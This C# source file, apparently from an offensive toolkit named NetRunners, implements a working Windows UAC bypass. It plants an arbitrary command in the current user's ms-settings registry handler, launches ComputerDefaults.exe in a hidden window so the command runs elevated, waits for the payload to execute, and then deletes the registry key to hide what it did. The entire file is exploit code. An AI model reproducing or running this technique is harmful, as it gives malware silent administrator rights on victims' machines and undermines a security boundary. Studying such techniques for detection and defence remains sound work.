using System.Threading;
using System.Diagnostics;
using System.Text;
using Microsoft.Win32;
using static NetRunnersUac.Check;

namespace NetRunners.Uac.Bypass
{
    public static partial class Bypass
    {
        public static void ComputerDefaults(byte[] encodedCommand)
        {
            //Credit: https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1

            //Check if UAC is set to 'Always Notify'
            CheckAlwaysNotify();

            //Convert encoded command to a string
            string command = Encoding.UTF8.GetString(encodedCommand);

            //Set the registry key for fodhelper
            RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
            newkey.CreateSubKey(@"ms-settings\Shell\Open\command");

            RegistryKey fod = Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\Shell\Open\command", true);
            fod.SetValue("DelegateExecute", "");
            fod.SetValue("", @command);
            fod.Close();

            //start fodhelper
            Process p = new Process();
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.FileName = "C:\\windows\\system32\\ComputerDefaults.exe";
            p.Start();

            //sleep 10 seconds to let the payload execute
            Thread.Sleep(10000);

            //Unset the registry
            newkey.DeleteSubKeyTree("ms-settings");
            return;
        }
    }
}